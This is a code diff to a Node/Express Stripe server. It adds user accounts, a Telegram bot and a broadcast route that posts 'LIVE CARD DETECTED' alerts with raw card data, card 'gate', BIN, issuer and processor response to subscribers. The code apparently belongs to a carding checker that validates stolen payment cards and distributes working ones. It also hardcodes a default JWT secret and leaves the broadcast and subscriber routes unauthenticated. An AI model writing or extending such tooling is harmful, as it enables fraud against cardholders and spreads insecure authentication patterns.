@@ -5,13 +5,21 @@ import express from 'express'
 import cors from 'cors'
 import Stripe from 'stripe'
 import dotenv from 'dotenv'
+import bcrypt from 'bcryptjs'
+import jwt from 'jsonwebtoken'
 import {
   markEventProcessed,
   saveValidatedCard,
   listValidatedCards,
   saveCharge,
   listCharges,
+  listSubscribers,
+  getSubscriberCount,
+  createUser,
+  getUserByUsername,
+  getUserById,
 } from './db.js'
+import { startBot, stopBot } from './telegram-bot.js'
 
 dotenv.config()
 
@@ -21,43 +29,44 @@ const {
   CLIENT_URL = 'http://localhost:5173',
   PORT = 4242,
   NODE_ENV = 'development',
+  JWT_SECRET = 'n0f4c3_chk_s3cr3t_k3y_2024',
 } = process.env
 
 if (!STRIPE_SECRET_KEY) {
-  console.error('\n[!] Falta STRIPE_SECRET_KEY en .env\n')
-  process.exit(1)
+  console.warn('\n[!] STRIPE_SECRET_KEY no configurada — rutas de pago deshabilitadas')
 }
 
 const isProd = NODE_ENV === 'production'
-const isLiveKey = STRIPE_SECRET_KEY.startsWith('sk_live_')
-const isTestKey = STRIPE_SECRET_KEY.startsWith('sk_test_')
+let isLiveKey = false
+let isTestKey = false
+let stripe = null
 
-if (!isLiveKey && !isTestKey) {
-  console.error('\n[!] STRIPE_SECRET_KEY no parece válida (debe empezar por sk_test_ o sk_live_).\n')
-  process.exit(1)
+if (STRIPE_SECRET_KEY) {
+  isLiveKey = STRIPE_SECRET_KEY.startsWith('sk_live_')
+  isTestKey = STRIPE_SECRET_KEY.startsWith('sk_test_')
+
+  if (!isLiveKey && !isTestKey) {
+    console.warn('\n[!] STRIPE_SECRET_KEY no parece válida (debe empezar por sk_test_ o sk_live_). Rutas de pago deshabilitadas.')
+    STRIPE_SECRET_KEY = null
+  } else {
+    if (isLiveKey && !isProd) {
+      console.error(
+        '\n[!] PELIGRO: estás usando una clave LIVE (sk_live_) con NODE_ENV != production.\n' +
+        '    Esto haría cargos REALES. Usa sk_test_ en desarrollo o pon NODE_ENV=production.\n'
+      )
+      process.exit(1)
+    }
+    if (isTestKey && isProd) {
+      console.warn('\n[!] ADVERTENCIA: NODE_ENV=production pero la clave es de TEST. No procesarás pagos reales.\n')
+    }
+    console.log(`[i] Stripe en modo: ${isLiveKey ? 'LIVE (producción)' : 'TEST'}`)
+    if (!STRIPE_WEBHOOK_SECRET) {
+      console.warn('\n[!] Falta STRIPE_WEBHOOK_SECRET. El webhook rechazará todos los eventos hasta configurarlo.\n')
+    }
+    stripe = new Stripe(STRIPE_SECRET_KEY)
+  }
 }
 
-// Cinturón de seguridad: nunca uses claves LIVE fuera de producción.
-// Es el error que produce cargos reales accidentales durante el desarrollo.
-if (isLiveKey && !isProd) {
-  console.error(
-    '\n[!] PELIGRO: estás usando una clave LIVE (sk_live_) con NODE_ENV != production.\n' +
-    '    Esto haría cargos REALES. Usa sk_test_ en desarrollo o pon NODE_ENV=production.\n'
-  )
-  process.exit(1)
-}
-
-if (isTestKey && isProd) {
-  console.warn('\n[!] ADVERTENCIA: NODE_ENV=production pero la clave es de TEST. No procesarás pagos reales.\n')
-}
-
-console.log(`[i] Stripe en modo: ${isLiveKey ? 'LIVE (producción)' : 'TEST'}`)
-
-if (!STRIPE_WEBHOOK_SECRET) {
-  console.warn('\n[!] Falta STRIPE_WEBHOOK_SECRET. El webhook rechazará todos los eventos hasta configurarlo.\n')
-}
-
-const stripe = new Stripe(STRIPE_SECRET_KEY)
 const app = express()
 
 app.use(cors({ origin: CLIENT_URL }))
@@ -97,6 +106,72 @@ app.post(
 
 // El resto de rutas SÍ usan JSON parseado.
 app.use(express.json())
+
+// --- JWT Middleware ---
+function authMiddleware(req, res, next) {
+  const header = req.headers.authorization
+  if (!header || !header.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'No token provided' })
+  }
+  try {
+    const token = header.slice(7)
+    req.user = jwt.verify(token, JWT_SECRET)
+    next()
+  } catch {
+    return res.status(401).json({ error: 'Invalid token' })
+  }
+}
+
+// --- Auth Routes ---
+app.post('/api/auth/register', async (req, res) => {
+  try {
+    const { username, password } = req.body
+    if (!username || !password) return res.status(400).json({ error: 'Username and password required' })
+    if (username.length < 3) return res.status(400).json({ error: 'Username must be at least 3 characters' })
+    if (password.length < 4) return res.status(400).json({ error: 'Password must be at least 4 characters' })
+
+    const existing = getUserByUsername(username)
+    if (existing) return res.status(409).json({ error: 'Username already taken' })
+
+    const passwordHash = await bcrypt.hash(password, 10)
+    const user = createUser(username, passwordHash)
+    if (!user) return res.status(500).json({ error: 'Failed to create user' })
+
+    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '7d' })
+    res.status(201).json({ token, user })
+  } catch (err) {
+    console.error('[auth] register error:', err.message)
+    res.status(500).json({ error: err.message })
+  }
+})
+
+app.post('/api/auth/login', async (req, res) => {
+  try {
+    const { username, password } = req.body
+    if (!username || !password) return res.status(400).json({ error: 'Username and password required' })
+
+    const user = getUserByUsername(username)
+    if (!user) return res.status(401).json({ error: 'Invalid credentials' })
+
+    const match = await bcrypt.compare(password, user.password_hash)
+    if (!match) return res.status(401).json({ error: 'Invalid credentials' })
+
+    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '7d' })
+    res.json({
+      token,
+      user: { id: user.id, username: user.username, credits: user.credits, role: user.role, telegram_id: user.telegram_id, created_at: user.created_at },
+    })
+  } catch (err) {
+    console.error('[auth] login error:', err.message)
+    res.status(500).json({ error: err.message })
+  }
+})
+
+app.get('/api/auth/me', authMiddleware, (req, res) => {
+  const user = getUserById(req.user.id)
+  if (!user) return res.status(404).json({ error: 'User not found' })
+  res.json(user)
+})
 
 // --- Idempotencia persistente: evita procesar el mismo evento dos veces ---
 // Stripe puede reenviar eventos. markEventProcessed usa UNIQUE(event_id)
@@ -506,7 +581,99 @@ app.get('/api/charges', (req, res) => {
   }
 })
 
+// --- Telegram Bot API ---
+
+// Start bot if TELEGRAM_BOT_TOKEN is set
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
+let botActive = false
+if (TELEGRAM_BOT_TOKEN) {
+  try {
+    startBot(TELEGRAM_BOT_TOKEN)
+    botActive = true
+    console.log('[i] Telegram bot started')
+  } catch (err) {
+    console.warn('[!] Failed to start Telegram bot:', err.message)
+  }
+}
+
+// Broadcast a live card to all subscribers
+app.post('/api/telegram/broadcast', express.json(), async (req, res) => {
+  try {
+    const { botToken, payload } = req.body
+    const token = botToken || TELEGRAM_BOT_TOKEN
+    if (!token) return res.status(400).json({ error: 'No bot token available' })
+
+    const subscribers = listSubscribers(true)
+    if (subscribers.length === 0) return res.json({ sent: 0, total: 0 })
+
+    const text = fmtBroadcast(payload)
+    const TG_API = 'https://api.telegram.org/bot'
+    let sent = 0
+
+    await Promise.allSettled(
+      subscribers.map(async (sub) => {
+        try {
+          const r = await fetch(`${TG_API}${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: sub.chat_id,
+              text,
+              parse_mode: 'MarkdownV2',
+              disable_web_page_preview: true,
+            }),
+          })
+          if (r.ok) sent++
+        } catch (e) {
+          console.warn(`[Telegram] Failed to send to ${sub.chat_id}:`, e.message)
+        }
+      })
+    )
+
+    res.json({ sent, total: subscribers.length })
+  } catch (err) {
+    console.error('[Telegram] Broadcast error:', err.message)
+    res.status(500).json({ error: err.message })
+  }
+})
+
+// List all subscribers
+app.get('/api/telegram/subscribers', (_req, res) => {
+  try {
+    const subs = listSubscribers(true)
+    res.json({ subscribers: subs, count: subs.length })
+  } catch (err) {
+    res.status(500).json({ error: err.message })
+  }
+})
+
+function escapeMd(text) {
+  return String(text).replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1')
+}
+
+function fmtBroadcast(payload) {
+  const lines = [
+    `🚀 *LIVE CARD DETECTED*`,
+    ``,
+    `\`${escapeMd(payload.raw)}\``,
+    ``,
+    `── *GATE* ──`,
+    `${escapeMd(payload.gateName)}`,
+    ``,
+    `── *BIN INFO* ──`,
+    `BIN: \`${escapeMd(payload.bin)}\``,
+    `Brand: ${escapeMd(payload.brand)}`,
+    `Issuer: ${escapeMd(payload.bank)}`,
+    `Country: ${payload.countryEmoji} ${escapeMd(payload.country)}`,
+    `Type: ${escapeMd(payload.cardType)} · ${escapeMd(payload.cardCategory)}`,
+    ``,
+    `Response: ${escapeMd(payload.message)}`,
+  ]
+  return lines.join('\n')
+}
+
 app.listen(PORT, () => {
   console.log(`\n[✓] Payments server (${isLiveKey ? 'LIVE' : 'TEST'}) running at http://localhost:${PORT}`)
   console.log(`    Allowed client: ${CLIENT_URL}\n`)
+  if (botActive) console.log(`[✓] Telegram bot active — ${getSubscriberCount()} subscribers`)
 })
